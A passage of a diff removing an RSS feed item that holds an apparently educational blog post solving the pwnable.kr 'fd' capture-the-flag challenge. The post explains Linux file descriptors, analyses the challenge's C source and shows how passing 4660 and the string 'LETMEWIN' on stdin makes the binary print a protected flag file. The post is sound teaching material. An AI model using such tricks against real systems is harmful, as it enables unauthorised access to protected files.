-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Finally, stdin is exactly what we type into the terminal from our keyboard. An example would be passing input to a command, such as:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ls&quot;&lt;/span&gt; | bash
-file1  file2  file3  stdout  test1  test2  test3
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here, our stdin is the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;ls&quot;&lt;/code&gt;, which is being passed to our bash interpreter.&lt;/p&gt;
-
-&lt;h2 id=&quot;-step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt; Step 2 - Understanding the problem&lt;/h2&gt;
-
-&lt;p&gt;Now that we know what a file descriptor is and how to use it, we can finally start the CTF.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;Tip: It’s good practice to check the CTF challenge before doing the research. In this case, however, since the challenge description mentioned something ‘new’ right from the bat, I decided to take the step back before actually checking the CTF problem. Most of the time, we need to first understand the proposed CTF challenge and then conduct the necessary research.&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;To start the CTF, we need to ssh into the machine. This can be done with the command:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh fd@pwnable.kr -p2222&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;You will be prompted for the password, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt;. After successfully connecting to the machine, we can simply run ls -l to see what we have in our home directory:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 16
-&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt; 1 fd_pwn fd   7322 Jun 11  2014 fd
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root   root  418 Jun 11  2014 fd.c
-&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 fd_pwn root   50 Jun 11  2014 flag
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note that we have a C code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd.c&lt;/code&gt;; a binary file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; and a text file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;. Let’s see who we are in the machine:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;fd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Okay, based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; command, we are not able to simply read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;, as we are not part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; group, nor are we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd_pwn&lt;/code&gt; user. However, we can read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd.c&lt;/code&gt; and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt;. We can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat fd.c&lt;/code&gt; to see its contents:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass argv[1] a number&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LETMEWIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;good job :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;learn about Linux file IO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This program seems to be taking a single-number argument in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; and evaluating the expression &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atoi(argv[1]) - 0x1234&lt;/code&gt;, storing the result into the variable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; C function takes a file descriptor as first argument, which means it will read what is passed in that specific descriptor. This is stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; buffer variable.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; function will compare the string stored in the buffer with “LETMEWIN\n”, and if they are equal, &lt;em&gt;i.e.&lt;/em&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; returns 0, the if statement becomes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!0&lt;/code&gt; (C equivalent to true).&lt;/p&gt;
-
-&lt;p&gt;The key to solve this problem is to pass an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; that will evaluate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; to a file descriptor we can control containing the string “LETMEWIN”.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
-
-&lt;p&gt;Now that we understand the basic concepts and the CTF problem, we need to think of a plausible attack vector. The easiest one in this case is to control the stdin descriptor, which is one that is hard to defend against. Looking at our table, this file descriptor is represented by the integer 0. So we need to pass an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; that will evaluate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; variable to 0. Note that:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd = atoi(argv[1]) - 0x1234&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;which is telling us that the number we pass will be subtracted by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1234&lt;/code&gt;, a hexadecimal value. We can use &lt;a href=&quot;https://www.rapidtables.com/convert/number/hex-to-decimal.html&quot;&gt;this&lt;/a&gt; website to convert hex to decimal. Note that the hexadecimal number 0x1234 is 4660 in decimal. So, if we need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; to be 0, we need to pass 4660 as the argument. If we did everything correctly, this argument will prompt us the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; function to input a stdin value, rather than just telling us to learn about Linux file IO, as we get if we pass a random number:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fd 123
-learn about Linux file IO
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;However, passing 4660, the code starts expecting another input!&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fd 4660
-asdasd
-learn about Linux file IO
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Promising!&lt;/p&gt;
-
-&lt;h2 id=&quot;-step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt; Step 4 - Solving!&lt;/h2&gt;
-
-&lt;p&gt;I think the solution becomes self explanatory at this point. If not, it may be a good idea to re-read this post!&lt;/p&gt;
-
-&lt;p&gt;When the code expects the second input, which is the stdin descriptor, we need to pass the string “LETMEWIN” so that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; evaluates to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!0&lt;/code&gt;, triggering the if statement that reads the flag:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fd 4660
-LETMEWIN
-good job :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-mommy! I think I know what a file descriptor is!!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Amazing! Enjoy your Poring card drop. It was well deserved!&lt;/p&gt;
-
-&lt;h3 id=&quot;-another-solution&quot;&gt;&lt;a href=&quot;#solution2&quot;&gt;&lt;/a&gt; Another solution&lt;/h3&gt;
-
-&lt;p&gt;Another way to solve this is piping the “LETMEWIN” string directly to the program. This is similar to the example we gave about stdin descriptor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;ls&quot; | bash&lt;/code&gt;, which executes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
-
-&lt;p&gt;Here, we basically do the same thing, but passing “LETMEWIN” to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./fd 4660&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~$ echo &quot;LETMEWIN&quot; | ./fd 4660
-good job :)
-mommy! I think I know what a file descriptor is!!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;
-
-&lt;p&gt;Solving CTFs and anything in life, for that matter, comes down to doing a good research beforehand.&lt;/p&gt;
-
-&lt;p&gt;In this CTF, we’ve learned what file descriptors are, as well as understood some C code analysis on the way.&lt;/p&gt;
-
-&lt;p&gt;Thanks for sticking ‘til the end. I hope you enjoyed it! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 01 Dec 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000//fd-pwnable</link>
-        <link href="http://localhost:4000/fd-pwnable"/>
-        <guid isPermaLink="true">http://localhost:4000/fd-pwnable</guid>
       </item>
     
   </channel>
